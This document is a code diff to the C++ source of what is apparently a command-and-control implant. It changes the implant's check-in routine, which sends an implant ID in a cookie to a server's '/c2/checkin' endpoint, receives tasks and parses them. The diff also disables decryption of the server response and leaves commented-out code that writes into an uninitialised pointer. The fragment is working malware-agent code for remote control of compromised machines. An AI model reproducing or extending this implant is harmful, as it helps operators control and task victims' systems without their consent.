@@ -6,6 +6,7 @@
 #include "profile.h"
 #include "task.h"
 #include "debug.h"
+#include "utils.h"
 #include <string>
 #include <iostream>
 
@@ -54,11 +55,24 @@ Task *Checkin(LPCWSTR serverUrl, MalleableProfile *profile)
 {
     DEBUG_PRINTF("Checkin\n");
     PSIZE_T outSize = 0;
-    string res = HTTPRequest(L"POST", serverUrl, L"/c2/register", 8080, L"Hello-world", NULL, NULL, 0, outSize, FALSE);
-
+    //string authCookie = "Cookie: " + profile->cookie + "=" + profile->implantId;
+    // char* authCookieString;
+    // sprintf(authCookieString, "Cookie: %s=%s", profile->cookie.c_str(), profile->implantId.c_str());
+    // cout << authCookieString << endl;
+    std::ostringstream oss;
+    oss << "Cookie: " << profile->cookie << "=" << profile->implantId;
+    string authCookieString = oss.str();
+    std::wstring authCookie(authCookieString.begin(), authCookieString.end());
+    DEBUG_PRINTF("Auth cookie: %ls\n", authCookie.c_str());
+    string res = HTTPRequest(L"GET", serverUrl, L"/c2/checkin", 8080, L"Hello-world", authCookie.c_str(), NULL, 0, outSize, FALSE);
+    DEBUG_PRINTF("Checkin done\n");
+    DEBUG_PRINTF("Checkin response: %s\n", res.c_str());
     // decode and decrypt the response
-    string resDecoded = decryptB64String(profile->base64ServerPublicKey,
+    string resDecoded = res; /*decryptB64String(profile->base64ServerPublicKey,
                                          profile->base64EncryptionKey,
-                                         res);
+                                         res);*/
+
+    DEBUG_PRINTF("Checkin response: %s\n", resDecoded.c_str());
+    
     return parseTask(resDecoded);
 }
